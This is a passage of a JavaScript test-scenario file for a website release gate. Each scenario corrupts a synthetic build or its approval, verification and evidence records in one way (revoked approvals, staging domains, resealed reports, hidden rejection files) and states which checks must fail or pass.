// The scenarios of the release readiness dry run (Gate 5 Phase 7, APR-JE-035; rebuilt for release model v2 in G6-2, APR-JE-039). Each one damages the fully
// green synthetic client build in exactly one way and runs the REAL release tool (`gate`, `prepare`) in the sandbox. The expectation is written down first:
//   mustFail   requirement ids that have to report FAIL, each with a message that says what is wrong
//   mayFail    requirement ids that legitimately fail as a consequence (a modified file also makes the recorded asset manifest stale, for example)
//   allow      the gate must stay ALLOWED (things that must not block: prose in a rationale, history, a replacement after a revocation, a document-only commit)
//   rg         the finding (RG-nn) the scenario is the blocking proof for; the check reports every finding's scenarios
//   anything else failing is reported as collateral, anything missing from mustFail as a requirement that did NOT block
// A "probe" does not assert; it records what the gate does with something it should arguably refuse, so that a gap is a measured fact.
import { appendFileSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { cpSync } from 'node:fs';
import { createSandbox, PERSONA, SYNTH, TODAY } from './release-dryrun.mjs';
import { verifyPackage } from './release-package.mjs';
import { buildManifest } from './hashed.mjs';
import { unzipTo, zipBuffer } from './zip.mjs';
import { listFiles, tempDir } from './git.mjs';
import { isReservedHost } from './hosts.mjs';
import { assembleCandidate } from './site.mjs';
import { loadReleasePolicy } from './release.mjs';
import { loadPolicy as loadSecurityPolicy, renderHeadersFile } from './security.mjs';
import { createHash } from 'node:crypto';
import { sealOf } from './verification.mjs';
import { fromParts } from './candidate.mjs';

const sha = (b) => createHash('sha256').update(b).digest('hex');
const REL = ['releaseApproval', 'productionHostAuthorised'];
const EV = ['evidence:real-device', 'evidence:screen-reader', 'evidence:browser-matrix', 'evidence:ci-run'];
const F = { rel: 'REL-JE-901.json', rights: 'RIGHTS-JE-901.json', srch: 'SRCH-JE-901.json' };
const OTHER = '0'.repeat(64);
const client = (fn) => (sb) => sb.committed(() => sb.json('config/client.json', fn));
const base = (url) => client((o) => { o.seo.baseUrl = url; });
const chg = (fn) => (sb) => sb.recordsChange(() => fn(sb));          // records only: the candidate digest cannot change
const mut = (file, fn, fam = 'approvals') => chg((sb) => sb.mutate(file, fn, fam));
const add = (type, over, file = null) => chg((sb) => { const r = sb.record(type, over); sb.put(r, undefined, file || sb.fileOf(r)); });
const rejected = (type, id, over = {}) => ({ id, status: 'rejected', decidedAt: `${TODAY()}T10:00:00Z`, ...over });
const ending = (type, id, ends, status = 'revoked', over = {}) => ({ id, status, ends, decidedAt: `${TODAY()}T11:00:00Z`, ...over });
const ev = (fn) => chg((sb) => fn(sb));
const evKey = (sb, id) => `${sb.spec.attachmentDir}/${sb.records.get(id).record.attachments[0].path}`;
const verifyWith = (fn, o) => (sb) => sb.writeVerify(fn, o);
const SECOND_OWNER = { reviewer: 'R-91', name: PERSONA.owner.name };

// ---- single-defect scenarios against `gate` -------------------------------------------------------------------------------------------------
export const GATE_SCENARIOS = [
  // ---- approvals: closed fields only; rejection, revocation and supersession (RG-04 to RG-07)
  { g: 'approvals', t: 'no release approval', apply: chg((sb) => sb.drop(F.rel)), mustFail: REL, detail: /no in-force release-approval/ },
  { g: 'approvals', t: 'a release approval bound to another candidate artifact', rg: 'RG-01', apply: mut(F.rel, (r) => { r.candidate = OTHER; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval for another version', apply: mut(F.rel, (r) => { r.version = '0.9.0'; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval for the demonstration channel', apply: mut(F.rel, (r) => { r.channel = 'demonstration'; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval record with a field missing (decidedBy)', apply: mut(F.rel, (r) => { delete r.decidedBy; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'approvals', t: 'a release approval whose status is "rejected"', rg: 'RG-04', apply: mut(F.rel, (r) => { r.status = 'rejected'; }), mustFail: REL, detail: /rejected/ },
  { g: 'approvals', t: 'an approval and a later rejection by an authorised reviewer (both in force)', rg: 'RG-04', apply: add('release-approval', rejected('release-approval', 'REL-JE-902')), mustFail: REL, detail: /rejected by REL-JE-902/ },
  { g: 'approvals', t: 'an approval revoked by an authorised reviewer', rg: 'RG-06', apply: add('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901')), mustFail: REL },
  { g: 'approvals', t: 'an approval superseded by an authorised reviewer, with no replacement', rg: 'RG-06', apply: add('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901', 'superseded')), mustFail: REL },
  { g: 'approvals', t: 'a status written as prose ("approved (REVOKED)")', rg: 'RG-06', apply: mut(F.rel, (r) => { r.status = 'approved (REVOKED)'; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'approvals', t: 'a status the model does not know ("pending")', apply: mut(F.rel, (r) => { r.status = 'pending'; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'approvals', t: 'an unauthorised revocation (a rights reviewer): the approval stays, but the record blocks until resolved', rg: 'RG-06', apply: add('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901', 'revoked', { decidedBy: { reviewer: 'R-92', name: PERSONA.rights.name } })), mustFail: ['recordsValid'], detail: /unauthorised revoked record/ },
  { g: 'approvals', t: 'an unauthorised rejection (a reviewer not in the table)', rg: 'RG-04', apply: add('release-approval', rejected('release-approval', 'REL-JE-902', { decidedBy: { reviewer: 'R-99', name: 'Nobody At All' } })), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a revocation that ends a record that does not exist', apply: add('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-777')), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a revocation that names an approval recorded for another candidate', apply: chg((sb) => { sb.put(sb.record('release-approval', { id: 'REL-JE-902', candidate: OTHER })); sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-903', 'REL-JE-902'))); }), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a revocation dated before the approval it ends', apply: add('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901', 'revoked', { decidedAt: '2026-01-02T00:00:00Z' })), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a revocation of a revocation', apply: chg((sb) => { sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901'))); sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-903', 'REL-JE-902', 'revoked', { decidedAt: `${TODAY()}T12:00:00Z` }))); }), mustFail: [...REL, 'recordsValid'] },
  { g: 'approvals', t: 'a revocation with no "ends" field', apply: add('release-approval', { id: 'REL-JE-902', status: 'revoked', decidedAt: `${TODAY()}T11:00:00Z` }), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a release approval by a reviewer who is not in the reviewer table', apply: mut(F.rel, (r) => { r.decidedBy = { reviewer: 'R-99', name: 'Nobody At All' }; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval by a reviewer who may not approve it (the rights persona)', apply: mut(F.rel, (r) => { r.decidedBy = { reviewer: 'R-92', name: PERSONA.rights.name }; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval signed with the wrong name for a valid reviewer id', apply: mut(F.rel, (r) => { r.decidedBy.name = 'Somebody Else'; }), mustFail: REL },
  { g: 'approvals', t: 'a release approval decided before the reviewer was authorised', apply: mut(F.rel, (r) => { r.decidedAt = '2025-06-01T09:00:00Z'; }), mustFail: REL },
  { g: 'approvals', t: 'an empty reviewer table (nobody is authorised)', apply: chg((sb) => sb.writeReviewers({ schema: 'jade-and-ember/reviewers@1', establishedBy: null, reviewers: [] })), mustFail: [...REL, 'rightsVerification', 'searchReadiness'] },
  { g: 'approvals', t: 'a reviewer table with a duplicate reviewer id', apply: chg((sb) => { const t = JSON.parse(readFileSync(join(sb.proj, 'engineering/release/reviewers.json'), 'utf8')); t.reviewers.push({ ...t.reviewers[0] }); sb.writeReviewers(t); }), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a reviewer table established by a governance record that does not exist', apply: chg((sb) => { const t = JSON.parse(readFileSync(join(sb.proj, 'engineering/release/reviewers.json'), 'utf8')); t.establishedBy = 'APR-JE-999'; sb.writeReviewers(t); }), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'an approval dated in the future', apply: mut(F.rel, (r) => { r.decidedAt = '2099-01-01T00:00:00Z'; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'approvals', t: 'a record file that is not valid JSON', apply: chg((sb) => writeFileSync(join(sb.dir('approvals'), 'broken.json'), '{ nope')), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a record of an unknown type', apply: chg((sb) => writeFileSync(join(sb.dir('approvals'), 'REL-JE-950.json'), JSON.stringify({ ...sb.record('release-approval'), type: 'something-else', id: 'REL-JE-950' }, null, 2))), mustFail: ['recordsValid'] },
  { g: 'approvals', t: 'a required governance approval (APR-JE-017) missing from the ledger', apply: chg((sb) => sb.writeLedger(sb.readLedger().split('\n').filter((l) => !l.startsWith('| APR-JE-017 |')).join('\n'))), mustFail: ['requiredApprovalsPresent'], detail: /APR-JE-017/ },
  // ---- the production domain, positively authorised (control 7)
  { g: 'domain', t: 'a release approval that carries no production host', apply: mut(F.rel, (r) => { delete r.subject.productionHost; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'domain', t: 'a release approval for another production host', apply: mut(F.rel, (r) => { r.subject.productionHost = 'www.some-other-restaurant.com'; }), mustFail: ['productionHostAuthorised'], detail: /authorises www\.some-other-restaurant\.com/ },
  { g: 'domain', t: 'a release approval for a host that is a preview address (pages.dev) while the build is for the real host', apply: mut(F.rel, (r) => { r.subject.productionHost = 'jade.pages.dev'; }), mustFail: ['productionHostAuthorised'] },
  { g: 'domain', t: 'a staging domain (pages.dev) as the production host', apply: base('https://jade-and-ember.pages.dev'), mustFail: ['productionDomain', 'productionHostAuthorised'], detail: /reserved|preview|staging/ },
  { g: 'domain', t: 'a reserved example domain (.test)', apply: base('https://jade.example.test'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
  { g: 'domain', t: 'a staging label in the host name (staging.)', apply: base('https://staging.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
  { g: 'domain', t: 'the domain changed after sign-off (committed, nothing re-recorded)', apply: (sb) => sb.committedUnbound(() => sb.json('config/client.json', (o) => { o.seo.baseUrl = 'https://www.changed-after-signoff.com'; })), mustFail: [...REL, 'rightsVerification', 'searchReadiness', 'verifyPassed', ...EV], mayFail: ['assetManifestCurrent'] },
  { g: 'domain', t: 'a staging word inside a sub-domain label (jade-staging.)', apply: base('https://jade-staging.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
  { g: 'domain', t: 'a numbered staging label (stage2.)', apply: base('https://stage2.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
  { g: 'domain', t: 'another hosting provider\'s preview domain (azurestaticapps.net)', apply: base('https://jade-ember.azurestaticapps.net'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
  { g: 'domain', t: 'a local address (https://localhost): the build refuses, or the gate does', apply: base('https://localhost'), mustFail: ['productionDomain', 'productionHostAuthorised'], error: /localhost|candidate build failed/, either: true },
  { g: 'domain', t: 'an IP address (https://192.0.2.10): the build refuses, or the gate does', apply: base('https://192.0.2.10'), mustFail: ['productionDomain', 'productionHostAuthorised'], error: /candidate build failed|IP/, either: true },
  // ---- rights verification and search review (RG-05, RG-07)
  { g: 'approvals', t: 'no rights verification', apply: chg((sb) => sb.drop(F.rights)), mustFail: ['rightsVerification'], detail: /rights-verification/ },
  { g: 'approvals', t: 'a rights verification that was rejected ("NOT verified")', rg: 'RG-05', apply: mut(F.rights, (r) => { r.status = 'rejected'; }), mustFail: ['rightsVerification'] },
  { g: 'approvals', t: 'a rights verification revoked by an authorised reviewer', rg: 'RG-05', apply: add('rights-verification', ending('rights-verification', 'RIGHTS-JE-902', 'RIGHTS-JE-901')), mustFail: ['rightsVerification'] },
  { g: 'approvals', t: 'a rights verification that names no source', apply: mut(F.rights, (r) => { r.subject.sources = []; }), mustFail: ['rightsVerification', 'recordsValid'] },
  { g: 'approvals', t: 'a rights verification with no date', apply: mut(F.rights, (r) => { r.subject.verifiedOn = 'today'; }), mustFail: ['rightsVerification', 'recordsValid'] },
  { g: 'approvals', t: 'a rights verification bound to another candidate', apply: mut(F.rights, (r) => { r.candidate = OTHER; }), mustFail: ['rightsVerification'] },
  { g: 'approvals', t: 'no search review', apply: chg((sb) => sb.drop(F.srch)), mustFail: ['searchReadiness'], detail: /search-review/ },
  { g: 'approvals', t: 'a search review that was rejected ("NOT reviewed")', rg: 'RG-07', apply: mut(F.srch, (r) => { r.status = 'rejected'; }), mustFail: ['searchReadiness'] },
  { g: 'approvals', t: 'a search review revoked by an authorised reviewer', rg: 'RG-07', apply: add('search-review', ending('search-review', 'SRCH-JE-902', 'SRCH-JE-901')), mustFail: ['searchReadiness'] },
  { g: 'approvals', t: 'a search review for other search artifacts (digest altered)', apply: mut(F.srch, (r) => { r.subject.searchDigest = r.subject.searchDigest.replace(/^./, (c) => (c === '0' ? '1' : '0')); }), mustFail: ['searchReadiness'] },
  { g: 'approvals', t: 'a search review that does not list the crawler policy', apply: mut(F.srch, (r) => { r.subject.reviewed = ['business-facts', 'structured-data']; }), mustFail: ['searchReadiness', 'recordsValid'] },
  { g: 'approvals', t: 'a search review that does not list the structured data', apply: mut(F.srch, (r) => { r.subject.reviewed = ['business-facts', 'crawler-policy']; }), mustFail: ['searchReadiness', 'recordsValid'] },
  { g: 'approvals', t: 'a search review for another candidate', apply: mut(F.srch, (r) => { r.candidate = OTHER; }), mustFail: ['searchReadiness'] },
  // ---- the verification record (RG-08): complete, sealed, for this candidate, made by this code
  { g: 'verification', t: 'no verification record', apply: (sb) => rmSync(join(sb.proj, 'engineering/.reports/verify.json')), mustFail: ['verifyPassed'], detail: /run npm run verify/ },
  { g: 'verification', t: 'a hand-written report in the old format ({ mode, passed, commit, dirty, assetsTree })', rg: 'RG-08', apply: (sb) => writeFileSync(join(sb.proj, 'engineering/.reports/verify.json'), JSON.stringify({ mode: 'full', passed: true, commit: sb.head, dirty: false, assetsTree: sb.state.assetsTree, results: [] })), mustFail: ['verifyPassed'], detail: /old report format/ },
  { g: 'verification', t: 'a record edited by hand (the seal no longer matches)', rg: 'RG-08', apply: verifyWith((v) => { v.checks[0].seconds = 99; }, { reseal: false }), mustFail: ['verifyPassed'], detail: /seal/ },
  { g: 'verification', t: 'a record with a check removed and the seal recomputed', rg: 'RG-08', apply: verifyWith((v) => { v.checks.pop(); }), mustFail: ['verifyPassed'], detail: /incomplete/ },
  { g: 'verification', t: 'a record with a check the verifier does not define, seal recomputed', rg: 'RG-08', apply: verifyWith((v) => { v.checks.push({ id: 'check:made-up', passed: true, seconds: 0 }); }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a record that lists a check twice, seal recomputed', rg: 'RG-08', apply: verifyWith((v) => { v.checks.push({ ...v.checks[0] }); }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a record with a failing check, seal recomputed', apply: verifyWith((v) => { v.checks[2].passed = false; }), mustFail: ['verifyPassed'], detail: /failing checks/ },
  { g: 'verification', t: 'a record that says passed although a check failed', rg: 'RG-08', apply: verifyWith((v) => { v.checks[2].passed = false; v.passed = true; }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a fast (partial) verification', apply: verifyWith((v) => { v.mode = 'fast'; }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a failed verification', apply: verifyWith((v) => { v.passed = false; }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a verification of another candidate artifact', rg: 'RG-01', apply: verifyWith((v) => { v.candidate = OTHER; }), mustFail: ['verifyPassed'], detail: /different candidate/ },
  { g: 'verification', t: 'a verification made by other verification code (engine digest differs)', rg: 'RG-08', apply: verifyWith((v) => { v.engineDigest = 'f'.repeat(64); }), mustFail: ['verifyPassed'], detail: /different verification code/ },
  { g: 'verification', t: 'a verification whose registry digest is not the verifier\'s', apply: verifyWith((v) => { v.registryDigest = 'f'.repeat(64); }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a verification run on a dirty tree', apply: verifyWith((v) => { v.source.dirty = true; }), mustFail: ['verifyPassed'] },
  { g: 'verification', t: 'a corrupt verification record (not JSON)', apply: (sb) => writeFileSync(join(sb.proj, 'engineering/.reports/verify.json'), '{'), error: /./ },
  { g: 'verification', t: 'the verifying code changed after the verification (a check edited and committed): the local record and the CI summary both belong to the old code', rg: 'RG-08', apply: (sb) => sb.committedUnbound(() => sb.edit('engineering/checks/tokens.mjs', (s) => `${s}\n// edited after verification\n`)), mustFail: ['verifyPassed', 'evidence:ci-run'], detail: /different verification code/ },
  // ---- the candidate artifact digest (RG-01, RG-09)
  { g: 'candidate', t: 'a stale recorded asset manifest (assets.manifest.json from another build)', rg: 'RG-09', apply: (sb) => sb.committed(() => writeFileSync(join(sb.proj, 'engineering/assets.manifest.json'), sb.git('show', `${sb.parent}:jade-and-ember/engineering/assets.manifest.json`).stdout), 'synthetic dry run: stale asset manifest', { regen: false }), mustFail: ['assetManifestCurrent'], detail: /does not match the built site/ },
  { g: 'candidate', t: 'a delivered file edited after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.edit('styles.css', (s) => `${s}\n/* edited after sign-off */\n`)), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV], mayFail: ['assetManifestCurrent'] },
  { g: 'candidate', t: 'a configuration value changed after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.json('config/client.json', (o) => { o.ordering.url = 'https://order.example-restaurant.test/changed-after-signoff'; })), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV], mayFail: ['assetManifestCurrent'] },
  { g: 'candidate', t: 'the release policy changed after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.json('engineering/release/policy.json', (o) => { o.deployment += ' (edited after sign-off)'; })), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV] },
  { g: 'candidate', t: 'the lockfile changed after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.edit('package-lock.json', (s) => `${s} `)), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV] },
  { g: 'candidate', t: 'an edit to a delivered file after testing, NOT committed (dirty tree)', apply: (sb) => sb.edit('styles.css', (s) => `${s}\n/* edited after sign-off */\n`), mustFail: ['cleanTree', 'verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV], mayFail: ['assetManifestCurrent'] },
  { g: 'tree', t: 'an untracked file in the working tree', apply: (sb) => writeFileSync(join(sb.proj, 'stray.txt'), 'x'), mustFail: ['cleanTree'], detail: /uncommitted/ },
  // ---- documents and records that must NOT invalidate anything
  { g: 'stays-valid', t: 'RG-01: only a document is committed after sign-off (the digest does not move)', rg: 'RG-01', allow: true, apply: (sb) => sb.committedUnbound(() => writeFileSync(join(sb.proj, 'engineering/NOTES-AFTER-SIGNOFF.md'), 'A note.\n')) },
  { g: 'stays-valid', t: 'RG-01: the ledger gains a governance row after sign-off', rg: 'RG-01', allow: true, apply: (sb) => sb.committedUnbound(() => sb.writeLedger(`${sb.readLedger()}| APR-JE-998 | ${TODAY()} | note | ${SYNTH} | none | none |\n`)) },
  { g: 'stays-valid', t: 'RG-01: a second reviewer is added to the table after sign-off', rg: 'RG-01', allow: true, apply: (sb) => sb.committedUnbound(() => { const t = JSON.parse(readFileSync(join(sb.proj, 'engineering/release/reviewers.json'), 'utf8')); t.reviewers.push({ id: 'R-94', name: 'Dry-run Extra Persona', role: 'synthetic dry-run persona (not a person)', mayApprove: [], mayReject: [], mayRevoke: [], validFrom: '2026-01-01', validTo: null }); sb.writeReviewers(t); }) },
  { g: 'stays-valid', t: 'RG-04: the words REJECTED and REVOKED in the rationale of an approved record', rg: 'RG-04', allow: true, apply: mut(F.rel, (r) => { r.rationale = `${SYNTH}. The owner did NOT reject this release and has not revoked it (REJECTED, REVOKED and NOT verified are only prose).`; }) },
  { g: 'stays-valid', t: 'RG-05: "NOT verified" in the rationale of an approved rights verification', rg: 'RG-05', allow: true, apply: mut(F.rights, (r) => { r.rationale = `${SYNTH}. An earlier draft said NOT verified; this record is the verification (prose only).`; }) },
  { g: 'stays-valid', t: 'RG-07: "NOT reviewed" in the rationale of an approved search review', rg: 'RG-07', allow: true, apply: mut(F.srch, (r) => { r.rationale = `${SYNTH}. NOT reviewed was the first draft; this is the review (prose only).`; }) },
  { g: 'stays-valid', t: 'an approval revoked, then a NEW approval recorded by an authorised reviewer', rg: 'RG-06', allow: true, apply: chg((sb) => { sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-902', 'REL-JE-901'))); sb.put(sb.record('release-approval', { id: 'REL-JE-903', decidedAt: `${TODAY()}T12:00:00Z` })); }) },
  { g: 'stays-valid', t: 'a rejection superseded by an authorised reviewer, then approved', rg: 'RG-04', allow: true, apply: chg((sb) => { sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902', { decidedAt: `${TODAY()}T10:00:00Z` }))); sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-903', 'REL-JE-902', 'superseded', { decidedAt: `${TODAY()}T11:00:00Z` }))); }) },
  { g: 'stays-valid', t: 'history: a rejection and an approval recorded for an older candidate', allow: true, apply: chg((sb) => { sb.put(sb.record('release-approval', { id: 'REL-JE-902', candidate: OTHER, status: 'rejected' })); }) },
  { g: 'stays-valid', t: 'two approvals of the same release by two authorised reviewers', allow: true, apply: add('release-approval', { id: 'REL-JE-902', decidedBy: SECOND_OWNER, decidedAt: `${TODAY()}T12:00:00Z` }) },
  { g: 'stays-valid', t: 'a positive record by an unauthorised person (not counted, harmless)', allow: true, apply: add('release-approval', { id: 'REL-JE-902', decidedBy: { reviewer: 'R-99', name: 'Nobody At All' } }) },
  // ---- the record folders: a file the gate does not read must not be able to hide a rejection (review F3), identity and time are exact (F8)
  { g: 'records', t: 'a REJECTION filed in deployments/ (the wrong family): it would never be read, so the folder refuses it', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'deployments'); }), mustFail: ['recordsValid'] },
  { g: 'records', t: 'a REJECTION filed in evidence/ (not an evidence record): refused, and evidence is not accepted beside it', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); writeFileSync(join(sb.evDir(), 'REL-JE-902.json'), JSON.stringify(r, null, 2)); }), mustFail: EV },
  { g: 'records', t: 'a REJECTION saved as REL-JE-902.JSON (upper-case extension)', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'approvals', 'REL-JE-902.JSON'); }), mustFail: ['recordsValid'] },
  { g: 'records', t: 'a REJECTION saved as REL-JE-902.json.bak', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'approvals', 'REL-JE-902.json.bak'); }), mustFail: ['recordsValid'] },
  { g: 'records', t: 'a REJECTION in a sub-folder (approvals/old/REL-JE-902.json)', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); mkdirSync(join(sb.dir('approvals'), 'old'), { recursive: true }); writeFileSync(join(sb.dir('approvals'), 'old', 'REL-JE-902.json'), JSON.stringify(r, null, 2)); }), mustFail: ['recordsValid'] },
  { g: 'records', t: 'a record that is a symlink to a file outside the repository', rg: 'RG-04', apply: chg((sb) => { const outside = join(sb.root, 'outside.json'); writeFileSync(outside, JSON.stringify(sb.record('release-approval', rejected('release-approval', 'REL-JE-902')))); symlinkSync(outside, join(sb.dir('approvals'), 'REL-JE-902.json')); }), mustFail: ['recordsValid'] },
  { g: 'records', t: 'a REJECTION that exists in the working tree but git has been told to ignore (never committed)', rg: 'RG-04', apply: (sb) => { appendFileSync(join(sb.root, '.git', 'info', 'exclude'), 'jade-and-ember/engineering/release/approvals/REL-JE-902.json\n'); sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902'))); }, mustFail: ['recordsValid'], detail: /not committed/ },
  { g: 'records', t: 'a record file that repeats a key ("status":"rejected" ... "status":"approved")', rg: 'RG-04', apply: chg((sb) => { const t = JSON.stringify(sb.record('release-approval', { id: 'REL-JE-902' }), null, 2).replace('{', '{\n  "status": "rejected",'); writeFileSync(join(sb.dir('approvals'), 'REL-JE-902.json'), t); }), mustFail: ['recordsValid'], detail: /duplicate key/ },
  { g: 'records', t: 'a rejection filed under another record\'s file name (REL-JE-903.json holds REL-JE-902)', apply: chg((sb) => { sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902')), 'approvals', 'REL-JE-903.json'); }), mustFail: ['recordsValid'], detail: /file name must be the record id/ },
  { g: 'records', t: 'a veto lifted by a reviewer who may revoke but could never have rejected (supersession is not a back door)', rg: 'RG-04', apply: chg((sb) => { const t = JSON.parse(readFileSync(join(sb.proj, 'engineering/release/reviewers.json'), 'utf8')); t.reviewers.push({ id: 'R-94', name: 'Dry-run Revoker Persona', role: 'synthetic dry-run persona (not a person)', mayApprove: [], mayReject: [], mayRevoke: ['release-approval'], validFrom: '2026-01-01', validTo: null }); sb.writeReviewers(t); sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902'))); sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-903', 'REL-JE-902', 'superseded', { decidedBy: { reviewer: 'R-94', name: 'Dry-run Revoker Persona' }, decidedAt: `${TODAY()}T11:00:00Z` }))); }), mustFail: [...REL, 'recordsValid'] },
  { g: 'records', t: 'a decision time that does not exist (2026-02-30)', apply: mut(F.rel, (r) => { r.decidedAt = '2026-02-30T09:00:00Z'; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'records', t: 'a decision time of 24:00:00', apply: mut(F.rel, (r) => { r.decidedAt = `${TODAY()}T24:00:00Z`; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'records', t: 'a decision time with fractional seconds (ordering by text would be wrong)', apply: mut(F.rel, (r) => { r.decidedAt = `${TODAY()}T09:30:00.5Z`; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'records', t: 'an approval timed an hour from now (later today is still the future)', apply: mut(F.rel, (r) => { r.decidedAt = new Date(Date.now() + 3600e3).toISOString().slice(0, 19) + 'Z'; }), mustFail: [...REL, 'recordsValid'] },
  { g: 'records', t: 'an array where a string belongs (candidate: ["…"])', apply: mut(F.rel, (r) => { r.candidate = [r.candidate]; }), mustFail: [...REL, 'recordsValid'] },
  // ---- evidence has negative semantics too (review F7)
  { g: 'evidence', t: 'a failed test of the same target recorded beside the passing one', rg: 'RG-08', apply: ev((sb) => { const e = sb.records.get('desktop-chrome'); const r = JSON.parse(JSON.stringify(e.record)); r.conclusion = 'failure'; r.attachments = []; writeFileSync(join(sb.evDir(), `desktop-chrome.${TODAY()}-b.json`), JSON.stringify(r, null, 2)); }), mustFail: ['evidence:browser-matrix'], detail: /FAILURE/ },
  { g: 'evidence', t: 'a CI run of another repository', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.url = 'https://github.com/someone-else/other-repo/actions/runs/123456'; })), mustFail: ['evidence:ci-run'] },
  { g: 'evidence', t: 'an evidence file that is not JSON at all, beside valid records', apply: ev((sb) => writeFileSync(join(sb.evDir(), 'zz-notes.json'), 'not json')), mustFail: EV },
  { g: 'evidence', t: 'an evidence backup file (desktop-chrome.json.bak)', apply: ev((sb) => writeFileSync(join(sb.evDir(), 'desktop-chrome.json.bak'), '{}')), mustFail: EV },
  // ---- what the candidate covers beyond the site files (review F1, F6)
  { g: 'candidate', t: 'serve.py (run by the recipient, shipped in the ZIP) edited after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.edit('serve.py', (s) => `${s}\n# edited after sign-off\n`)), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV] },
  { g: 'candidate', t: 'shared source code the checks rely on (src/lib/seo.mjs) edited after verification', rg: 'RG-08', apply: (sb) => sb.committedUnbound(() => sb.edit('src/lib/seo.mjs', (s) => `${s}\n// edited after verification\n`)), mustFail: ['verifyPassed', 'evidence:ci-run'], detail: /different verification code/ },
  { g: 'candidate', t: 'the CI workflow edited after verification', rg: 'RG-08', apply: (sb) => sb.committedUnbound(() => { const d = join(sb.root, '.github', 'workflows'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'jade-and-ember-verify.yml'), 'name: edited\n'); }), mustFail: ['verifyPassed', 'evidence:ci-run'] },
  // ---- version, findings and configuration (committed, with the synthetic records re-bound, so the single defect stays single)
  { g: 'configuration', t: 'an open Blocker finding', apply: (sb) => sb.committed(() => sb.json('engineering/findings.json', (o) => o.findings.push({ id: 'F-DRY-1', check: 'dry-run', key: 'dry-run:blocker', severity: 'Blocker', visual: false, status: 'open', description: 'synthetic' }))), mustFail: ['noBlockingFindings'], detail: /F-DRY-1/ },
  { g: 'configuration', t: 'an open Major finding', apply: (sb) => sb.committed(() => sb.json('engineering/findings.json', (o) => o.findings.push({ id: 'F-DRY-2', check: 'dry-run', key: 'dry-run:major', severity: 'Major', visual: false, status: 'open', description: 'synthetic' }))), mustFail: ['noBlockingFindings'] },
  { g: 'configuration', t: 'a finding with an unknown severity', apply: (sb) => sb.committed(() => sb.json('engineering/findings.json', (o) => o.findings.push({ id: 'F-DRY-3', check: 'dry-run', key: 'dry-run:sev', severity: 'Whatever', visual: false, status: 'open', description: 'synthetic' }))), mustFail: ['noBlockingFindings'] },
